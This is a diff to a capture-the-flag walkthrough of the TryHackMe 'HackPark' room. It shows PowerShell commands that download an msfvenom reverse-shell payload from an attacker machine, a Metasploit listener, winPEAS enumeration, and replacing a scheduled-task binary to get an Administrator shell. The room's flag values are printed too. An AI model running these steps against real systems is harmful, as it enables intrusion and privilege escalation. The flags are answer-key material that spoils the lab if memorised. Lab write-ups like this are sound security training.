@@ -364,70 +364,34 @@ Then setup a simple server in that directory, ideally use a common port that is 
 
 Then upload the exploit to the target and check it arrived:
 ```
-c:\windows\system32\inetsrv>
-cd c:\windows\temp
-c:\Windows\Temp>
-powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'"
-dir shell.*
+c:\Windows\Temp> powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'"
 c:\Windows\Temp>dir shell.*
- Volume in drive C has no label.
- Volume Serial Number is 0E97-C552
- Directory of c:\Windows\Temp
+...
 04/19/2026  12:41 PM            73,802 shell.exe
-               1 File(s)         73,802 bytes
-               0 Dir(s)  38,981,611,520 bytes free
 ```
-Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp same as msfvenom payload):
+
+\Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp same as msfvenom payload):
 ```
-msf6 > use exploit multihandler
-[-] No results from search
-[-] Failed to load module: exploit
 msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > show options 
-Payload options (generic/shell_reverse_tcp):
-
-   Name   Current   Required  Description
-          Setting             
-   ----   --------  --------  ----------
-   LHOST            yes       The listen address 
-                              (an interface may 
-                              be specified)
-   LPORT  4444      yes       The listen port
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Wildcard Target
-
-View the full module info with the info, or info -d command.
-
 msf6 exploit(multi/handler) > set LHOST <AttackBoxIP>
-LHOST => <AttackBoxIP>
 msf6 exploit(multi/handler) > set LPORT 4444
-LPORT => 4444
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-payload => windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on <AttackBoxIP>:4444 
 ```
+
 Next upload winPEAS to target similarly start a python3 server in directory with the exploit.
-Note even if other simple server is closed will need to be a different port, as error thrown with no upload.
-```
-root@ip-<AttackBoxIP>:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:6000/) ...
-```
-then use a simple powershell command to upload winPEAS to target:
-```
-powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:6000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
-```
+Then use a simple powershell command to upload winPEAS to target:
 File transferred successfully after changing port 8000 to 6000 even though previous server was closed.
 ```
 root@ip-<AttackBoxIP>:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 6000
-Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:6000/) ...
+Serving HTTP on 0.0.0.0 port 6000 (http://0.0.0.0:6000/) ...
 <targetIP> - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
 ```
+```
+powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:6000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
+```
+
 Output when winPEAS is run will run off the screen so save to file from the directory its uploaded to:
 ```
 c:\windows\temp\winPEAS.bat > output.txt
@@ -439,11 +403,10 @@ meterpreter> download C:\\Windows\\Temp\\output.txt /home/kali/CTF/HackPark/
 ```
 
 Its worth noting upload similar way except it does not work possibly due to EDR or antivirus or limitations of the THM target.
-That is using, upload <remote_path> <local_path> 
-
+That is using: upload <remote_path> <local_path> 
 
 ## Q2 What is the OS version of this windows machine?
-This can be obtained from winPEAS output.txt file or just typing sysinfo in meterpreter
+This can be obtained from winPEAS output.txt file or just typing sysinfo in meterpreter. Hint suggests use metasploit 'sysinfo'
 ```
 meterpreter > sysinfo
 Computer        : HACKPARK
@@ -455,10 +418,12 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 meterpreter > 
 ```
+
 Answer: Windows 2012 R2 (6.3 Build 9600)
 
 ## Q3 Can you spot a service running some automated task that could be easily exploited? What is the name of this service?
-This is where winPEAS output is used. Look in "[+] RUNNING PROCESSES" section
+This is where winPEAS output is used. Look in "[+] RUNNING PROCESSES" section or just running ps from meterpreter prompt and scrolling down.
+
 Answer: WindowsScheduler  
 
 ## Q4 What is the name of the binary you're supposed to exploit?
@@ -471,25 +436,9 @@ Listing: c:\program files (x86)
 
 Mode          Size  Type  Last modified           Name
 ----          ----  ----  -------------           ----
-040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  Common Files
-xrwx                      100
-040777/rwxrw  4096  dir   2014-03-21 19:07:01 +0  Internet Explorer
-xrwx                      000
-040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  Microsoft.NET
-xrwx                      100
+...
 040777/rwxrw  8192  dir   2019-08-04 12:37:02 +0  SystemScheduler
-xrwx                      100
-040777/rwxrw  0     dir   2019-08-06 22:12:04 +0  Uninstall Information
-xrwx                      100
-040777/rwxrw  0     dir   2013-08-22 16:39:33 +0  Windows Mail
-xrwx                      100
-040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  Windows NT
-xrwx                      100
-040777/rwxrw  0     dir   2013-08-22 16:39:30 +0  WindowsPowerShell
-xrwx                      100
-100666/rw-rw  174   fil   2013-08-22 16:37:57 +0  desktop.ini
--rw-                      100
-
+...
 meterpreter > cd systemscheduler
 meterpreter > cd events
 meterpreter > pwd
@@ -517,7 +466,7 @@ Mode          Size   Type  Last modified          Name
 100666/rw-rw  0      fil   2026-04-20 19:45:20 +  service.flg
 -rw-                       0100
 ```
-
+Here quick looks shows that 20198415519.INI_LOG.txt is of interest with message.exe running every 30 seconds.
 ```
 meterpreter > head 20198415519.INI_LOG.txt 
 04/20/26 11:43:02,Event Started Ok, (Administrator)
@@ -532,7 +481,15 @@ meterpreter > head 20198415519.INI_LOG.txt
 04/20/26 11:47:33,Process Ended. PID:2140,ExitCode:4,Message.exe (Administrator)
 meterpreter > 
 ```
-run simple server again use the shell.exe 
+
+Here we need to determine who set this process running and then determine the two flags for jeff (on Desktop) and for root user.
+
+Next replace the message.exe file with the shell.exe previously used:
+- rename message.exe message.bak
+- rename shell.exe message.exe
+- Then let message run from scheduled task by backgrounding meterpreter shell and restarting the listener to allow it to reconnect from this new files location.
+
+- Two ways to run the powershell command one is:
 meterpreter> shell
 c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://10.146.85.223:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
 
@@ -542,75 +499,42 @@ meterpreter > load powershell
 Loading extension powershell...Success.
 meterpreter > powershell_shell
 ```
-Then enter powershell commands from powershell prompt, but here this is not easier.
+Then enter powershell commands from powershell prompt.
 
-Next replace the message.exe file:
-ren message.exe message.bak
-ren shell.exe message.exe
-
-
+Since the previous one already done I used powershell method instead.
 ```
 meterpreter > load powershell
 Loading extension powershell...Success.
 meterpreter > powershell_shell
 PS > cd "c:\program files (x86)\SystemScheduler\"
 PS > dir mes*
-
-
     Directory: C:\program files (x86)\SystemScheduler
-
-
 Mode                LastWriteTime     Length Name
 ----                -------------     ------ ----
 -a---         3/25/2018  10:58 AM     536992 Message.exe
 
 PS > ren message.exe message.bak
 PS > dir mes*
-
-
     Directory: C:\program files (x86)\SystemScheduler
-
-
 Mode                LastWriteTime     Length Name
 ----                -------------     ------ ----
 -a---         3/25/2018  10:58 AM     536992 message.bak
-
-PS > Invoke-WebRequest -Uri 'http://10.65.115.87:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\message.exe'
-PS > dir mes*
-
-
-    Directory: C:\program files (x86)\SystemScheduler
-
-
-Mode                LastWriteTime     Length Name
-----                -------------     ------ ----
--a---         3/25/2018  10:58 AM     536992 message.bak
-
 
 PS > Invoke-WebRequest -Uri 'http://10.65.115.87:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\message.exe'
 PS > dir mes* 
-
-
     Directory: C:\program files (x86)\SystemScheduler
-
-
 Mode                LastWriteTime     Length Name
 ----                -------------     ------ ----
 -a---         3/25/2018  10:58 AM     536992 message.bak
 -a---         4/21/2026  11:57 AM      73802 message.exe
-
-
-PS > 
 ```
-Now every 3 minutes message is run. So background the meterpreter session and back at metasploit prompt rerun the listener:
+Rerun the the listener exploit/multi/handler:
 ```
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.65.115.87:4444 
 [*] Sending stage (177734 bytes) to 10.65.176.189
 [*] Meterpreter session 2 opened (10.65.115.87:4444 -> 10.65.176.189:49605) at 2026-04-21 20:08:03 +0100
 
-meterpreter > whoami
-[-] Unknown command: whoami. Run the help command for more details.
 meterpreter > shell
 Process 1712 created.
 Channel 1 created.
@@ -623,30 +547,12 @@ whoami
 C:\PROGRA~2\SYSTEM~1>echo %username%
 echo %username%
 Administrator
-
-C:\PROGRA~2\SYSTEM~1>c:\\
 ```
+
 Move to jeffs Desktop to find flag
 ```
-C:\PROGRA~2\SYSTEM~1>whoami
-whoami
-
-C:\PROGRA~2\SYSTEM~1>echo %username%
-echo %username%
-Administrator
-
-C:\PROGRA~2\SYSTEM~1>cd c:\users
-cd c:\users
-
 c:\Users>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 0E97-C552
-
- Directory of c:\Users
-
-08/04/2019  11:54 AM    <DIR>          .
-08/04/2019  11:54 AM    <DIR>          ..
+...
 08/03/2019  11:15 AM    <DIR>          .NET v4.5
 08/03/2019  11:15 AM    <DIR>          .NET v4.5 Classic
 08/05/2019  02:03 PM    <DIR>          Administrator
@@ -655,18 +561,9 @@ dir
                0 File(s)              0 bytes
                7 Dir(s)  38,985,801,728 bytes free
 
-c:\Users>cd jeff/Desktop
-cd jeff/Desktop
-
 c:\Users\jeff\Desktop>dir
 dir
- Volume in drive C has no label.
- Volume Serial Number is 0E97-C552
-
- Directory of c:\Users\jeff\Desktop
-
-08/04/2019  11:55 AM    <DIR>          .
-08/04/2019  11:55 AM    <DIR>          ..
+...
 08/04/2019  11:57 AM                32 user.txt
                1 File(s)             32 bytes
                2 Dir(s)  38,985,801,728 bytes free
@@ -674,18 +571,12 @@ dir
 c:\Users\jeff\Desktop>type user.txt
 type user.txt
 759bd8af507517bcfaede78a21a73e39
+```
+Same for Administrator flag:
+```
 c:\Users\jeff\Desktop>cd "c:\users\Administrator\Desktop"
-cd "c:\users\Administrator\Desktop"
-
 c:\Users\Administrator\Desktop>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 0E97-C552
-
- Directory of c:\Users\Administrator\Desktop
-
-08/04/2019  11:49 AM    <DIR>          .
-08/04/2019  11:49 AM    <DIR>          ..
+...
 08/04/2019  11:51 AM                32 root.txt
 08/04/2019  04:36 AM             1,029 System Scheduler.lnk
                2 File(s)          1,061 bytes
@@ -694,7 +585,6 @@ dir
 c:\Users\Administrator\Desktop>type root.txt
 type root.txt
 7e13d97f05f7ceb9881a3eb3d78d3e72
-c:\Users\Administrator\Desktop>
 ```
 ```
 
